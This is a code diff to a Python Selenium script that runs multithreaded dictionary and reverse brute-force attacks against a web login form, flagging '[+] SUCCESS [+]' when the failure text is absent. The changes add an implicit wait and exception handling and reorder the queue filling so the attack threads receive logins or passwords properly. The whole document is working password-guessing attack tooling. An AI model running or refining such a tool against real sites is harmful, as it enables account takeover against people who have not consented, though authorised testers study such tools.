@@ -24,8 +24,7 @@ class TargetObj:
 	def __init__(self):
 		self.__driver = webdriver.Firefox()
 		self.__driver.get(TargetObj.url)
-		#WebDriverWait(self.__driver, 10);
-		time.sleep(TIME_PAUSE)
+		self.__driver.implicitly_wait(10);
 
 
 	def __get_input(self, var_name):
@@ -76,12 +75,14 @@ class TargetObj:
 
 
 	def parse_response(self):
-		body = self.__driver.find_element_by_tag_name("body")
-		if self.failure_sign in body.text:
-			return "FAIL"
-		else:
-			return "[+] SUCCESS [+]"
-
+		try:
+			body = self.__driver.find_element_by_tag_name("body")
+			if self.failure_sign in body.text:
+				return "FAIL"
+			else:
+				return "[+] SUCCESS [+]"
+		except:
+			return "[!] PARSING PAGE ERROR [!]"
 
 	def exit_driver(self):
 		self.__driver.quit()
@@ -102,7 +103,7 @@ def dict_attack(target_obj, queue, password_list):
 	"""
 	 Dictionary attack of target url based on
 	 default brute force (try all password for every login)
-	 e.g. login:pass1, login:pass2, login:pass3, etc.
+	 e.g. login:pass1, login:pass2, login:pass3 and so on.
 	"""
 	while True:
 		login = queue.get()
@@ -129,6 +130,8 @@ def brute_force(logins, passwords, num_threads, reverse = False):
 	# list with objects of TargetObj class #
 	target_objs = []
 	if reverse == False:
+		for login in logins:
+			queue.put(login)
 		for thread_counter in range(num_threads):
 			# creating target object with driver for each thread #
 			obj_per_thread = TargetObj()
@@ -138,10 +141,10 @@ def brute_force(logins, passwords, num_threads, reverse = False):
 			thrd.daemon = True
 			thrd.start()
 
-		for login in logins:
-			queue.put(login)
 
 	else:
+		for passwd in passwords:
+				queue.put(passwd)
 		for thread_counter in range(num_threads):
 			obj_per_thread = TargetObj()
 			target_objs.append(obj_per_thread)
@@ -150,8 +153,6 @@ def brute_force(logins, passwords, num_threads, reverse = False):
 			thrd.daemon = True
 			thrd.start()
 
-		for passwd in passwords:
-			queue.put(passwd)
 	queue.join()
 
 	# quit drivers #
